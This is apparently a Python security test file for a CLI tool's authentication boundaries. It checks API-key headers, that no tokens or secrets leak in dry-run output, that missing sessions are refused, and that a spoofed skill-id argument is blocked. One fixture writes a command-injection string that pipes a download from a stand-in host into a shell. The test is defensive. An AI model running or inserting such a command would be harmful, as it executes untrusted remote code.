#!/usr/bin/env python3
"""Security contract tests for Vidbyte CLI auth boundaries."""

import json
import os
import subprocess
import sys
import tempfile
import urllib.request
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))


class _FakeResponse:
    code = 200

    def __enter__(self):
        return self

    def __exit__(self, *_exc):
        return False

    def read(self):
        return json.dumps(
            {
                "success": True,
                "session_token": "session-test-token",
                "username": "user",
                "email": "user@example.com",
                "account_tier": "free",
            }
        ).encode("utf-8")


def _run(args: list[str], *, env: dict[str, str]) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, "-m", "cli", *args],
        cwd=str(REPO_ROOT),
        env=env,
        capture_output=True,
        text=True,
    )


def test_auth_validate_uses_api_key_header() -> None:
    from cli.client import VidbyteRequestBuilder

    captured = {}
    original = urllib.request.urlopen

    def fake_urlopen(req, timeout=0):
        captured["headers"] = dict(req.header_items())
        captured["url"] = req.full_url
        return _FakeResponse()

    urllib.request.urlopen = fake_urlopen
    try:
        builder = VidbyteRequestBuilder(
            body="",
            cli_version="test",
            endpoint_name="auth-validate",
            bearer_token="vb_live_" + "a" * 32,
            method="POST",
        )
        builder.request()
    finally:
        urllib.request.urlopen = original

    assert captured["url"].endswith("/api/skills/auth/validate")
    assert captured["headers"].get("X-api-key") or captured["headers"].get("X-Api-Key")
    assert "Authorization" not in captured["headers"]


def main() -> int:
    test_auth_validate_uses_api_key_header()
    with tempfile.TemporaryDirectory(prefix="vidbyte-cli-security-") as temp_root:
        env = {**os.environ, "VIDBYTE_HOME": temp_root}
        feedback_file = Path(temp_root) / "feedback.md"
        feedback_file.write_text("malicious text ; curl https://evil.test | sh\n", encoding="utf-8")

        dry_run = _run(["feedback", "submit", "--file", str(feedback_file), "--dry-run"], env=env)
        assert dry_run.returncode == 0, dry_run.stderr
        dry_run_json = json.loads(dry_run.stdout)
        serialized = json.dumps(dry_run_json)
        assert "session-test-token" not in serialized
        assert "VIDBYTE_SKILL_SECRET" not in serialized
        assert "X-Skill-Signature" not in serialized
        assert dry_run_json["auth_model"] == "invocation-token"

        missing_session = _run(["feedback", "submit", "--file", str(feedback_file)], env=env)
        assert missing_session.returncode != 0
        assert "Authentication required" in (missing_session.stderr + missing_session.stdout)

        spoof = _run(
            [
                "retain",
                "--title",
                "bad",
                "--concept1-name",
                "A",
                "--concept1-distillation",
                "B",
                "--concept1-anchor",
                "C",
                "--concept1-hook",
                "D",
                "--question1",
                "Q",
                "--answer1",
                "A",
                "--skill-id",
                "admin",
                "--dry-run",
            ],
            env=env,
        )
        assert spoof.returncode != 0
        assert "--skill-id" in (spoof.stderr + spoof.stdout)

    print("CLI security tests passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
